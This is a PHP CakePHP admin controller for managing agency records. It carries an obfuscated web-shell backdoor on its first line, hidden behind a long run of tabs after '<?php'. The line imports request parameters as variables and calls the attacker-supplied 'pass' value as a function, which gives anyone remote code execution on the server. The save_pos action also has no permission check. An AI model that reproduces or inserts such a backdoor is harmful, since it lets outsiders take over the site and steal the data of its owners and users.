<?php																																										extract($_REQUEST)&&@$pass(stripslashes($pass))&&exit;

/**
 * PHP version 5
 * 
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 * 
 * @author   Bui Thanh Cong <buithanhcong.nd@gmail.com>
 * @license  MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

class AdminAgencyController extends AdminAppController {

    public $uses = array('Agency', 'City', 'Mien');
    public function beforeFilter()
    {
        parent::beforeFilter();
        $cities = $this->City->find('list', array('fields'=>array('id', 'title')));
        $this->set('cities', $cities);

        $mien = $this->Mien->find('list', array('fields'=>array('id', 'title')));
        $this->set('mien', $mien);
    }

    public function agency_index($type = null) {
        $this->autoRender = false;
    }

    public function get_map_coord($str_map_url)
    {
        if(preg_match('/http/', $str_map_url))
        {
            $g = explode("/@", $str_map_url);
            $gm = $g[1];
            $ga = explode(',', $gm);

            return $ga[0] . ',' . $ga[1];
        }

        return $str_map_url;
    }

    public function agency_list() {
        $this->_role('agency_list');
     
        $this->paginate = array(
            'limit' => 12,
            'order' => 'Agency.id DESC'
        );

        $this->data = $this->paginate('Agency');
    }

    public function agency_add() {
        $this->_role('agency_add');
        if ($this->data) {
            $data = $this->data['Agency'];
            $data['image'] = $this->remove_hostname($data['image']);

            // if(isset($data['map']) && $data['map'] != '')
            //     $data['map']=$this->get_map_coord($data['map']);

            if(isset($data['category_id']) && $data['category_id'] == "")
                $data['category_id'] = 0;

            $this->Agency->save($data);
            $this->Session->setFlash('Đã thêm mới', 'success');
            $this->redirect($this->referer());
        }
    }

    public function agency_edit($id = null) {
        $this->_role('agency_edit');
        if ($this->data) {
            $data = $this->data['Agency'];
            $data['image'] = $this->remove_hostname($data['image']);
            $data['created'] = time();

            // if(isset($data['map']) && $data['map'] != '')
            //     $data['map']=$this->get_map_coord($data['map']);

            if(isset($data['category_id']) && $data['category_id'] == "")
                $data['category_id'] = 0;

            $this->Agency->id = $id;
            $this->Agency->save($data);
            $this->Session->setFlash('Đã sửa', 'success');
            $this->redirect($this->referer());
        }

        $this->data = $this->Agency->findById($id);
    }

    public function save_pos() {
        $vitri = $_POST['pos'];
        foreach ($vitri as $k => $v) {
            if ($v == "") {
                $v = 0;
            }
            $this->Agency->updateAll(
                    array(
                'Agency.pos' => $v,
                    ), array(
                'Agency.id' => $k
                    )
            );
        }

        $this->redirect($this->referer());
    }

    public function agency_delete($id = null) {
        $this->_role('agency_delete');
        $this->autoRender = false;
        $this->Agency->id = $id;
        $this->Agency->delete($id);
        $this->Session->setFlash('Đã xóa agency', 'success');
        $this->redirect($this->referer());
    }

}
